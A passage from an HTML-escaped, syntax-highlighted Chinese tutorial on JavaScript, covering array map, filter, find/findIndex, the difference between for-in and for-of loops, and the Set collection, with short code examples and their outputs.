&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; [ &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; ]
&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; [ &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; ]
&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; [ &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; ]
&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt; [ &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; ]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;9arrayprototypemap&#34;&gt;9.Array.prototype.map&lt;/h2&gt;
&lt;p&gt;返回一个处理过后的新数组&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;mapArr&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;]

&lt;span style=&#34;color:#75715e&#34;&gt;// 三个参数：遍历项 索引 数组本身
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// 配合箭头函数，对每一个元素进行翻倍
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;mapArr2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;mapArr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;map&lt;/span&gt;((&lt;span style=&#34;color:#a6e22e&#34;&gt;num&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;index&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt;) =&amp;gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;num&lt;/span&gt;)
&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;mapArr2&lt;/span&gt;)
[ &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt; ]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;10arrayprototypefilter&#34;&gt;10.Array.prototype.filter&lt;/h2&gt;
&lt;p&gt;过滤数组&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;filterArr&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;]

&lt;span style=&#34;color:#75715e&#34;&gt;// 三个参数：遍历项 索引 数组本身
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// 配合箭头函数，返回大于3的集合
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;filterArr2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;filterArr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;filter&lt;/span&gt;((&lt;span style=&#34;color:#a6e22e&#34;&gt;num&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;index&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt;) =&amp;gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;num&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;)
&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;filterArr2&lt;/span&gt;)
[ &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; ]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;11find-和-findindex&#34;&gt;11.find 和 findIndex&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;find：从数组中找到返回被找元素，找不到返回 undefined&lt;/li&gt;
&lt;li&gt;findIndex：从数组中找到返回被找元素索引，找不到返回 -1&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;findArr&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [
  { &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;科比&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;no&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;24&amp;#39;&lt;/span&gt; },
  { &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;罗斯&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;no&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;1&amp;#39;&lt;/span&gt; },
  { &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;利拉德&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;no&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;0&amp;#39;&lt;/span&gt; }
]

&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;kobe&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;findArr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;find&lt;/span&gt;(({ &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt; }) =&amp;gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;===&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;科比&amp;#39;&lt;/span&gt;)
&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;kobeIndex&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;findArr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;findIndex&lt;/span&gt;(({ &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt; }) =&amp;gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;===&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;科比&amp;#39;&lt;/span&gt;)
&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;kobe&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;// { name: &amp;#39;科比&amp;#39;, no: &amp;#39;24&amp;#39; }
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;kobeIndex&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;// 0
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;12for-of--和--for--in&#34;&gt;12.for of  和  for  in&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;for in ：以任意顺序遍历一个对象的除 Symbol 以外的可枚举属性。&lt;/li&gt;
&lt;li&gt;for of ：在可迭代对象（包括 Array，Map，Set，String，TypedArray，arguments 对象等等）上创建一个迭代循环，调用自定义迭代钩子，并为每个不同属性的值执行语句&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;无论是 for in 还是 for of 语句都是迭代一些东西。它们之间的主要区别在于它们的迭代方式。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;for in 语句以任意顺序迭代对象的可枚举属性。&lt;/li&gt;
&lt;li&gt;for of 语句遍历可迭代对象定义要迭代的数据。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;我们来看以下示例&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;Object.&lt;span style=&#34;color:#a6e22e&#34;&gt;prototype&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;objCustom&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt;() {};
Array.&lt;span style=&#34;color:#a6e22e&#34;&gt;prototype&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;arrCustom&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt;() {};

&lt;span style=&#34;color:#66d9ef&#34;&gt;let&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;iterable&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;];
&lt;span style=&#34;color:#a6e22e&#34;&gt;iterable&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;foo&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;hello&amp;#39;&lt;/span&gt;;
&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;iterable&lt;/span&gt;)
&lt;span style=&#34;color:#75715e&#34;&gt;// [3, 5, 7, foo: &amp;#39;hello&amp;#39;]
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;let&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;iterable&lt;/span&gt;) {
  &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;); 
  &lt;span style=&#34;color:#75715e&#34;&gt;// 0, 1, 2, &amp;#34;foo&amp;#34;, &amp;#34;arrCustom&amp;#34;, &amp;#34;objCustom&amp;#34;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;}

&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;let&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;iterable&lt;/span&gt;) {
  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;iterable&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;hasOwnProperty&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;)) {
    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;); 
    &lt;span style=&#34;color:#75715e&#34;&gt;// 0, 1, 2, &amp;#34;foo&amp;#34;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  }
}

&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;let&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;of&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;iterable&lt;/span&gt;) {
  &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;); 
  &lt;span style=&#34;color:#75715e&#34;&gt;// 3, 5, 7
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;上述代码中每个对象 Object 都将继承 objCustom 的属性，并且作为 Array 的每个对象要继承 arrCustom 属性，因此对象 iterable 继承属性 objCustom 和 arrCustom。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;let&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;iterable&lt;/span&gt;) {
  &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;); &lt;span style=&#34;color:#75715e&#34;&gt;// 0, 1, 2, &amp;#34;foo&amp;#34;, &amp;#34;arrCustom&amp;#34;, &amp;#34;objCustom&amp;#34;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;上述循环打印的是 iterable 对象的所有可枚举属性，它不记录数组元素 3， 5，7 或 hello，因为这些不是枚举属性。它打印了数组的索引以及 arrCustom 和 objCustom。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;let&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;iterable&lt;/span&gt;) {
  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;iterable&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;hasOwnProperty&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;)) {
    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;); &lt;span style=&#34;color:#75715e&#34;&gt;// 0, 1, 2, &amp;#34;foo&amp;#34;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这个循环类似于第一个，但是它使用 hasOwnProperty() 来检查，检查找到的枚举属性是否是对象自己的（不是继承的）。如果是，该属性被记录。记录的属性是0，1，2和 foo，因为它们是自身的属性（不是继承的）。属性 arrCustom 和 objCustom 不会被记录，因为它们是继承的。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;let&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;of&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;iterable&lt;/span&gt;) {
  &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;); &lt;span style=&#34;color:#75715e&#34;&gt;// 3, 5, 7
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;该循环迭代并记录 iterable 作为可迭代对象定义（ iterable，定义时是数组 ）的迭代值，即数组元素 3，5，7。&lt;/p&gt;
&lt;h2 id=&#34;13set-和-map&#34;&gt;13.Set 和 Map&lt;/h2&gt;
&lt;p&gt;Set 对象是值的集合，你可以按照插入的顺序迭代它的元素。 Set 中的元素只会出现一次，即 Set 中的元素是唯一的，不重复的。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// 可不传数组
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;set1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Set&lt;/span&gt;()
&lt;span style=&#34;color:#a6e22e&#34;&gt;set1&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;add&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
&lt;span style=&#34;color:#a6e22e&#34;&gt;set1&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;add&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;)
&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;set1&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;// Set(2) { 1, 2 }
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// 也可传数组
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;set2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Set&lt;/span&gt;([&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;])
&lt;span style=&#34;color:#75715e&#34;&gt;// 增加元素 使用 add
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;set2&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;add&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;)
&lt;span style=&#34;color:#a6e22e&#34;&gt;set2&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;add&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt;)
&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;set2&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;// Set(5) { 1, 2, 3, 4, &amp;#39;A&amp;#39; }
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// 是否含有某个元素 使用 has
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;set2&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;has&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;)) &lt;span style=&#34;color:#75715e&#34;&gt;// true
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// 查看长度 使用 size
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;set2&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;size&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;// 5
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// 删除元素 使用 delete
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;set2&lt;/span&gt;.&lt;span style=&#34;color:#66d9ef&#34;&gt;delete&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;)
&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;set2&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;// Set(4) { 1, 3, 4, &amp;#39;A&amp;#39; }
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// 增加一个已有元素，则增加无效，会被自动去重
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;set1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Set&lt;/span&gt;([&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;])
&lt;span style=&#34;color:#a6e22e&#34;&gt;set1&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;add&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
